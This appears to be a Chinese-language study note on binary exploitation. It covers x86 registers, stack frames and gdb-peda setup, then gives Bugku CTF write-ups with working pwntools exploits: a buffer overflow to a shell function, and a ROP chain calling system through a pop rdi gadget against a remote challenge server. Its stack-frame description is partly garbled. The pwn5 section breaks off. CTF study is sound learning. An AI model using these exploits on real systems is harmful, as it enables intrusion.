# 基础知识
参考
https://blog.csdn.net/wang010366/article/details/52505345

## 寄存器
- 通用寄存器
  - 一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi），以及堆栈指针寄存器（esp、ebp）
- 特殊寄存器两类
  - 段地址寄存器（ss、cs、ds、es、fs、gs），标志位寄存器（EFLAGS），以及指令指针寄存器（eip）
## 分段内存
从高至低内存空间
Stack-->ss
Heap-->
BSS-->
Data-->ds
Code-->cs

## 重要的 汇编指令 及函数调用及销毁的栈帧流程
- CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为 call ptr
- RET：返回指令，操作为将栈顶数据弹出至eip，格式为 RET

> 1. 将callee参数 逆序 压栈
> 
> ==call开始==
> 2. 将caller的next eip 压栈，更新eip为calle的地址(call fun())
> 3. 将caller的ebp压栈，更新ebp为callee的ebp(push ebp)
> 4. 将callee的局部变量压栈(esp-10,mov a b)
> 
> ==call结束==
> 5. 将callee的esp指向ebp，释放callee的局部变量(move esp ebp)
> 6. 将callee的ebp指向caller的ebp(pop ebp)
> 7. 将callee的esp指向caller的next eip(esp+1)
> 8. 将caller的esp+1，指向caller的栈顶，并next eip 赋值给eip，至此现场回复完毕(pop esp)

## gdb-peda kali 中安装
1. git clone https://github.com/longld/peda.git ~/peda
2. echo "source ~/peda/peda.py" >> ~/.gdbinit

## gdb-peda使用
1. cd /mnt/hgfs/Downloads/
2. file human
3. file /mnt/hgfs/Downloads/human
4. running human
5. exec-file human
6. break printf
7. r

参考教程： https://www.cnblogs.com/arnoldlu/p/9633254.html


## pwn2(bugku)
1. ROP,修改返回地址到内存中的代码
2. 将附件拖进IDA中，发现read(0, &s, 0x100uLL);存在溢出
3. 发现getshell函数中存在system（cat flag）可直接利用
4. 双击s变量，发现s中栈地址为0x30，64位ebp占用8个字节，返回地址位置为0x38 * 'a',getshell函数地址为0x400751,payload=0x38 * 'a'+p64(0x400751)
5. exp=>

```
from pwn import *
sh = remote("114.116.54.89", 10003)
print sh.recv()
payload="A" * 0x38 + p64(0x400751)
sh.sendline(payload)
sh.interactive()
```

## pwn4(bugku)
1. ROP,ida打开发现s存在溢出

```
  memset(&s, 0, 0x10uLL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Come on,try to pwn me");
  read(0, &s, 0x30uLL);
  puts("So~sad,you are fail");
  return 0LL;
```
2. 找到system函数地址0x400570，但system参数不为/bin/sh，经提示，打开strings窗口找到$0,地址为0x60111f
3. 由于64位的函数参数不压栈，放在寄存器里面，我们要想办法把$0放到寄存器中，需要pop rdi;ret;这样的指令，于是，我们利用ROPgadget工具查询指令

```
root@kali:/mnt/hgfs/Downloads# ROPgadget --binary pwn4  --only "pop|ret" | grep "rdi" 
0x00000000004007d3 : pop rdi ; ret
```
4. 找到地址后可构造payload = 'a'*0x18h +p64(0x4007d3)+p64(0x60111f)+p64(0x601020)

exp

```
from pwn import *

p = remote("114.116.54.89" ,10004)

system = 0x400570
pop_rdi_ret = 0x4007d3
bin_sh = 0x60111F

p.recvuntil('pwn me\n')
payload = 'a' * (0x10 + 8) 
payload += p64(pop_rdi_ret) 
payload += p64(bin_sh) 
payload += p64(system)
p.sendline(payload)
p.interactive()
```

## pwn5(bugku)
参考 https://blog.csdn.net/weixin_44954083/article/details/103500313
1. 查看nx，发现nx保护

```
root@kali:/mnt/hgfs/Downloads# checksec ./human
[*] '/mnt/hgfs/Downloads/human'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
2. 没有system，只能通过libc，libc的绝对地址=基地址+相对地址，动态调试，发现实际地址xxx，减去相对地址240，等于相对地址

```
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe148 --> 0x400821 (<main+139>:	lea    rax,[rbp-0x20])
0008| 0x7fffffffe150 --> 0xa3838 ('88\n')
0016| 0x7fffffffe158 --> 0x0 
0024| 0x7fffffffe160 --> 0x0 
0032| 0x7fffffffe168 --> 0x0 
0040| 0x7fffffffe170 --> 0x4008d0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe178 --> 0x7ffff7e16bbb (<__libc_start_main+235>:	mov    edi,eax)
0056| 0x7fffffffe180 --> 0x0
```

